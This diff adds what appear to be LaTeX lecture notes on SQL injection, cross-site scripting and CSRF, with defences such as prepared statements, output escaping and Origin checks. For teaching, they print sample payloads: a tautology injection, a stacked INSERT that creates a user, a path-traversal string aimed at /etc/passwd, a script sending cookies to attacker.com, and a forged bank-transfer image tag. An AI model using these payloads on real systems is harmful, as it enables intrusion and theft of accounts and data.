@@ -1,0 +1,348 @@
+\section{SQL injection \& Cross Site Scripting}
+\subsection{SQL Injection}
+\paragraph{SQL Injection}
+
+SQL injection occurs when an application incorporates user input directly into an SQL query without proper sanitization or parameterization.
+
+\vspace{0.3em}
+
+\textbf{Consequence:} an attacker may alter the structure of the query executed by the database.
+
+\paragraph{Identifying a vulnerability}
+
+The first step is usually to make assumptions about how the input is used by the application.
+
+\vspace{0.3em}
+
+For example, suppose the input is inserted into a \texttt{WHERE} clause:
+
+\begin{lstlisting}[language=SQL]
+SELECT * FROM users
+WHERE username = '<input>';
+\end{lstlisting}
+
+\vspace{0.3em}
+
+Special characters such as quotes (\texttt{'}) may reveal that user input is being interpreted as SQL code rather than as data.
+
+\paragraph{Modifying query logic}
+
+If a field is vulnerable, the attacker may inject a condition that always evaluates to true:
+
+\begin{lstlisting}[language=SQL]
+SELECT fieldlist FROM table
+WHERE field = 'anything' OR 'x'='x';
+\end{lstlisting}
+
+\vspace{0.3em}
+
+Since \texttt{'x'='x'} is always true, the query may return all rows of the table.
+
+\paragraph{Schema discovery}
+
+SQL injection can also be used to infer information about the database schema.
+
+\vspace{0.3em}
+
+\textbf{Column discovery}
+
+\begin{itemize}
+    \item Guess a column name.
+    \item Use it in a condition such as \texttt{FIELD\_NAME IS NULL}.
+    \item If an error occurs, the guessed column likely does not exist.
+\end{itemize}
+
+\vspace{0.3em}
+
+\textbf{Table discovery}
+
+\begin{lstlisting}[language=SQL]
+x' AND 1=(SELECT COUNT(*)
+          FROM SomeGuessedTableName); --'
+\end{lstlisting}
+
+\vspace{0.3em}
+
+Differences in behavior or error messages may reveal whether the table exists.
+
+\paragraph{Modifying the database}
+
+In severe cases, SQL injection may allow the execution of additional SQL statements.
+
+\vspace{0.3em}
+
+Example: attempting to create a new user.
+
+\begin{lstlisting}[language=SQL]
+x'; INSERT INTO users
+('email','passwd','login_id','name')
+VALUES ('steve@unixwiz.net',
+        'hello',
+        'steve',
+        'Steve Friedl'); --'
+\end{lstlisting}
+
+\vspace{0.3em}
+
+Possible consequences include:
+
+\begin{itemize}
+    \item Authentication bypass.
+    \item Disclosure of confidential data.
+    \item Modification of existing records.
+    \item Creation of new accounts.
+    \item Administrative actions on the database.
+\end{itemize}
+
+\paragraph{Limitations of \texttt{INSERT} attacks}
+
+Note that inserting a new user is often more difficult in practice:
+
+\begin{itemize}
+    \item The database account may not have \texttt{INSERT} privileges.
+    \item The attacker may not know the exact schema of the table.
+    \item Additional fields may be required.
+    \item A valid user account may require entries in multiple tables (roles, permissions, access rights, etc.).
+\end{itemize}
+
+\vspace{0.3em}
+
+Instead of an \texttt{INSERT}, an attacker may therefore attempt an \texttt{UPDATE} on an existing record.
+
+\paragraph{Timing attacks}
+
+Even if the attacker cannot directly read or modify data, SQL injection may still leak information through \textbf{side channels}.
+
+\vspace{0.3em}
+
+\textit{Idea:} execute an expensive operation only when a condition is true and measure the server's response time.
+
+
+\vspace{0.3em}
+
+Example:
+
+\begin{itemize}
+    \item If the first character of Bob's password is \texttt{A}, delay the query by several seconds.
+    \item Measure the response time.
+    \item A longer response indicates that the guess was correct.
+\end{itemize}
+
+By repeating this process for every position and every possible character, the entire password can eventually be reconstructed.
+
+\paragraph{Other injection vulnerabilities}
+
+Injection attacks are not limited to SQL. They occur whenever \textbf{unsanitized user input} is interpreted as code, commands, or file paths.
+
+\vspace{0.3em}
+
+Example: \textbf{Path Traversal}
+
+\begin{lstlisting}
+open("/path/to/pictures/" + imageName)
+\end{lstlisting}
+
+If the application does not validate \texttt{imageName}, an attacker may supply:
+
+\begin{lstlisting}
+../../../../../etc/passwd
+\end{lstlisting}
+
+and access files outside the intended directory.
+
+\paragraph{Mitigation}
+
+\begin{itemize}
+    \item \textbf{Never trust external input.}
+    \item Validate and sanitize user data.
+    \item Apply the \textbf{principle of least privilege} to database accounts.
+    \item Avoid exposing detailed error messages to users.
+    \item Use \textbf{prepared statements}.
+    \item Use \textbf{stored procedures} when appropriate.
+\end{itemize}
+
+\paragraph{Prepared Statements}
+
+Instead of:
+
+\begin{lstlisting}[language=Java]
+String query =
+"SELECT * FROM users WHERE name='" + n + "'";
+\end{lstlisting}
+
+use:
+
+\begin{lstlisting}[language=Java]
+String query =
+"SELECT * FROM users WHERE name=?";
+\end{lstlisting}
+
+\vspace{0.3em}
+
+\textbf{Key idea:}
+
+\begin{itemize}
+    \item The SQL query is parsed \emph{before} receiving the user input.
+    \item User values are sent separately as parameters.
+    \item Input is therefore treated as \textbf{data}, not as SQL code.
+    \item Quotes, keywords and operators cannot alter the query structure.
+\end{itemize}
+
+\paragraph{Stored Procedures}
+
+With stored procedures, the SQL logic resides inside the database:
+
+\begin{lstlisting}[language=Java]
+{call checkUsername(?)}
+\end{lstlisting}
+
+\vspace{0.3em}
+
+The application can only provide parameters; it cannot modify the SQL logic implemented by the procedure itself.
+
+
+\subsection{Cross-Site Scripting}
+
+\paragraph{Sessions and cookies}
+
+HTTP is a \textbf{stateless} protocol: each request is independent and the server has no built-in notion of a logged-in user.
+
+\vspace{0.3em}
+
+To implement sessions, a web application:
+
+\begin{enumerate}
+    \item Authenticates the user.
+    \item Generates a random \textbf{session token}.
+    \item Stores the token in a browser cookie.
+    \item Receives the cookie in all subsequent requests.
+\end{enumerate}
+
+The session token therefore acts as a temporary proof of authentication.
+
+\paragraph{Same-Origin Policy (SOP)}
+
+A web page is normally only allowed to access data belonging to the \textbf{same origin}.
+
+\vspace{0.3em}
+
+An origin is defined by the triplet:
+
+\[
+(\texttt{protocol},\ \texttt{host},\ \texttt{port})
+\]
+\vspace{0.3em}
+As a consequence, a malicious website cannot directly read another website's cookies, local storage, or page contents.
+
+
+\paragraph{XSS: Key idea}
+
+The goal of a Cross-Site Scripting attack is to execute attacker-controlled \texttt{JavaScript} inside a trusted website.
+
+
+
+\vspace{0.3em}
+
+For example, an attacker may submit the following review:
+
+\begin{lstlisting}[language=HTML]
+<script>
+fetch("https://attacker.com/steal?c=" +
+      encodeURIComponent(document.cookie));
+</script>
+\end{lstlisting}
+
+If the website stores and displays this review without sanitization, the script will execute whenever another user views the page.
+Since the code executes \emph{inside Amazon's page}, the browser considers it to originate from Amazon itself.
+
+\paragraph{Persistent vs Reflected XSS}
+
+\textbf{Persistent XSS}
+
+\begin{itemize}
+    \item Malicious code is stored on the server (reviews, comments, profiles, etc.).
+    \item Every visitor executes the injected code.
+\end{itemize}
+
+\vspace{0.3em}
+\textbf{Reflected (Non-persistent) XSS}
+
+\begin{itemize}
+    \item Malicious code is embedded in a crafted URL parameter.
+    \item The victim must be convinced to visit the URL (e.g., through an email or social media post).
+    \item The vulnerable web application must include the attacker-controlled parameter in the generated page without properly sanitizing or escaping it.    
+    \item The attacker-controlled input is therefore \emph{reflected} by the server into the response.
+    \item The injected JavaScript is immediately executed by the victim's browser.
+\end{itemize}
+
+\paragraph{Mitigation}
+
+\begin{itemize}
+    \item Validate and \textbf{sanitize} user input.
+    \item Escape special HTML characters before inserting user input into the page (e.g., \texttt{<script>} becomes \texttt{\&lt;script\&gt;}).
+    \item Use frameworks providing automatic output encoding.
+    \item Store untrusted user content on a separate domain (eg: \url{googleusercontent.com})
+    \item Use \textbf{XSS Filters}
+    \item Use browser XSS protections and Content Security Policies (CSP).
+\end{itemize}
+\subsection{Cross-Site Request Forgery (CSRF)}
+
+\paragraph{Key idea}
+
+Unlike XSS, the attacker does not execute code inside the trusted website. Instead, they trick the victim's browser into sending an authenticated request to a website on which the victim is already logged in.
+
+\vspace{0.3em}
+
+The attack relies on the fact that browsers automatically include cookies associated with a website in every request sent to that website.
+
+\paragraph{Example}
+
+Suppose a user is logged into their online banking website and therefore possesses a valid session cookie.
+
+\vspace{0.3em}
+
+The user then visits a malicious website containing:
+
+\begin{lstlisting}[language=HTML]
+<img src=
+"https://bank.com/transfer?
+to=attacker&amount=10000">
+\end{lstlisting}
+
+When loading the image, the browser automatically sends:
+
+\begin{itemize}
+    \item The request to \texttt{bank.com}.
+    \item The user's session cookie for \texttt{bank.com}.
+\end{itemize}
+
+The bank therefore receives what appears to be a legitimate authenticated request and may perform the transfer.
+
+\paragraph{Difference with XSS}
+
+\textbf{XSS}
+
+\begin{itemize}
+    \item The attacker injects JavaScript into the trusted website.
+    \item The attacker's code executes with the website's privileges.
+    \item Cookies and page contents may be accessed.
+\end{itemize}
+
+\vspace{0.3em}
+
+\textbf{CSRF}
+
+\begin{itemize}
+    \item The attacker never gains access to the session cookie.
+    \item The attacker simply causes the victim's browser to send a request.
+    \item The browser automatically authenticates the request using the stored cookie.
+\end{itemize}
+
+\paragraph{Mitigation}
+
+\begin{itemize}
+    \item Verify the \texttt{Referer} or \texttt{Origin} header that informs the source of the request.
+    \item Avoid performing sensitive actions through simple \texttt{GET} requests.
+    \item Avoid storing session token as cookie but sending as normal parameter. This way it isn't included by browser automatically and thus attacker can't count on it.
+\end{itemize}
+
